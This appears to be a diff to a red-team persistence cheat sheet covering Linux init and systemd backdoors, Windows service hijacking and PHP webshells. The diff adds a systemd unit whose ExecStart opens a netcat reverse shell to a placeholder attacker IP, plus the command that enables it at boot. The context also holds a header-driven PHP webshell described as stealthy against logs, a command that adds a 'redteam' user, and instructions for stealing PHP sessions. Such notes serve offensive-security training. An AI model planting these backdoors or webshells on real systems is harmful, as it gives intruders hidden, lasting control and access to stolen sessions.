@@ -48,6 +48,7 @@ Ex: `sudo ln -s /etc/init.d/syslogd-helper /etc/rc3.d/S99syslogd-helper`
 >S99 stands for `Start 99`, meaning that when the victim machine restarts or turns on, it will start (S) your backdoor at the end of the boot process (99).  
 
 ###### systemd (Newer Method):
+Create the following service descriptor at `/etc/systemd/system/backdoor-name.service` 
 
 ##### Binding to known good executables
 >[!danger] This will not hold up to AV 
@@ -55,6 +56,19 @@ Ex: `sudo ln -s /etc/init.d/syslogd-helper /etc/rc3.d/S99syslogd-helper`
 Use [[MSFVenom]] to bind a payload to a frequently-used binary to maintain your persistence. 
  
 >[!warning] Maintain a clean copy of the binary to assist in cleanup
+
+```bash
+[Unit]  
+Description=Very important backdoor.[Service]  
+Type=simple  
+ExecStart=/usr/bin/nc -e /bin/bash <ATTACKER_IP> <PORT> 2>/dev/null[Install]  
+WantedBy=multi-user.target
+```
+Enable the backdoor service to run on restart:
+
+```bash
+systemctl enable backdoor
+```
 
 ### Windows
 - Registry Run Keys
@@ -75,7 +89,7 @@ Use [[MSFVenom]] to bind a payload to a frequently-used binary to maintain your 
 	- Replace the binPath property of an existing Windows service with your implant to avoid creating a new service. Simple commands can also be used as binPath, meaning `net user redteam password /add` is permissible. If you plan to use an implant as a service make sure to compile as `exe-service` with [[MSFVenom]].
 
 ### Web Servers
-=======
+
 #### PHP (Web Servers)
 
 ###### PHP Webshell
@@ -102,6 +116,8 @@ echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";
 ```
 Command execution example: `curl -H "CMD: ls" http://example.com/webscript.php`
 - This method sends the commands via a custom HTTP header. HTTP headers often aren't displayed in logs, so it's quite stealthy. 
+
+For more information on webshells, see `/usr/share/webshells/php` on your Kali machine. 
 ###### Stealing PHP Sessions
 - This is basically session hijacking, but with PHP. 
 - Some web servers write their session IDs to disk. When a web server does that, you can go find the file that contains the session IDs and use them to log in as an authorized user. 
